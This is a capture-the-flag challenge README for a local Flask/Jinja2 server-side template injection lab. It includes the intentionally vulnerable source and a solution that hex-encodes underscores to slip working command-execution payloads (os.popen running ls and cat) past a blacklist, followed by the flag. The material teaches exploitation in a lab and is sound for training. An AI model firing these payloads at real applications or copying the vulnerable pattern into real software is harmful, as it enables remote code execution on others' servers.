# SSTI-Easy 2

### Difficulty: Easy

### Objective: Bypass blacklisted ("_")

## Setting Up

Ensures that `Docker` is installed into your machine as this challenge requires Docker. If you're unsure how to do it, you can refer [here](https://www.kali.org/docs/containers/installing-docker-on-kali/) to install it into your Kali machine. Then, install the files `app.py` , `Dockerfile` and `flag-d3a358c6bff2c9f7412e5485b3e2cd2e.txt` into the same directory.

### Commands (Kali)
[1] `sudo docker build -t sstichall .`

[2] `sudo docker run -d sstichall`

[3] `sudo docker logs <The container id>`

Use the first IP provided by the command [3] to access the challenge as highlighted below.

![image](https://github.com/user-attachments/assets/a2dc8099-2cb9-42d9-a8d2-c34d04b245e8)

Challenge should look like this and you are ready to go!

![image](https://github.com/user-attachments/assets/71d4d057-c35f-4c21-b28f-efaa2f35bff9)

## Solution 
<details>

The challenge starts with a text box and allows user input. Then, we starts with the a simple text "hello world" and observe its response.

![image](https://github.com/user-attachments/assets/8c6da092-9fc2-4a3b-9054-d900ca44c47d)

The website seems to return our text back as a response. 

![image](https://github.com/user-attachments/assets/03732c9a-86e7-4042-9ea6-9877e978db85)

Let's try using a simple SSTI payload `{{7*7}}` and observe its behaviour.

![image](https://github.com/user-attachments/assets/d853ed2f-3c60-48bd-880a-be6fa23756ca)

The website returns `49`! That means it is vulnerable to SSTI.

![image](https://github.com/user-attachments/assets/26b6ae54-1bfe-4884-9df2-66fe944dbcea)

Let's use a SSTI payload like `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}` to list down files in the directory!

![image](https://github.com/user-attachments/assets/579ab938-dac5-4d4a-8aed-3edd8ad37819)

The website somehow is blocking our payload. Looks like they blacklisted some characters.

![image](https://github.com/user-attachments/assets/01fb2f5e-312b-48a1-b6b6-ffc1ceec65d7)

Let's analyze the source code and figure out what character did the website blacklisted.

### Source Code (python)
```python

from flask import Flask, request, url_for, render_template_string
import re

app=Flask(__name__)

blacklisted=[r"\_"]

@app.route('/', methods=('GET','POST'))
def index():
        if request.method=='POST':
                note=request.form['note']
                if sanitize(note):
                        return render_template_string(note)
                else:
                        return('Please provide valid text')
        return '''
                <form method="POST">
                        Note:<input type="text" name="note">
                        <input type="submit" value="Submit">
                </form>
        '''

def sanitize(x):
        for i in blacklisted:
                if re.findall(i,x):
                        return False
        return True

if __name__=='__main__':
        app.run(host='0.0.0.0',port= 5000,debug=True)  

```

The website is confirmed to be vulnerable to SSTI (Jinja 2) as the source code contains the function `render_template_string`. However, there is a function that seems to be preventing us from reaching the vulnerable function which is the `sanitize()`. It will return boolean `False` when it detected the strings contains underscores which can prevent a regular SSTI payload. We can use another SSTI payload to bypass this sanitization by encoding "_" into hex strings which is `\x5f`. Therefore, the payload should look something like this.

`{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('ls')['read']()}}`

Let's use this payload to list down the directories and see what happens.

![image](https://github.com/user-attachments/assets/e3482f8e-2d40-45b3-b004-398812761e3c)

And it works! We successfully view all the files contain inside the server directory. Let's try viewing the flag using this command:

`{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('cat flag-d3a358c6bff2c9f7412e5485b3e2cd2e.txt ')['read']()}}`

![image](https://github.com/user-attachments/assets/28949435-0e8d-4d1c-b292-492768262978)


## Flag
>flag{3a823364c48716d80fb5a766454bacd4} 

</details>
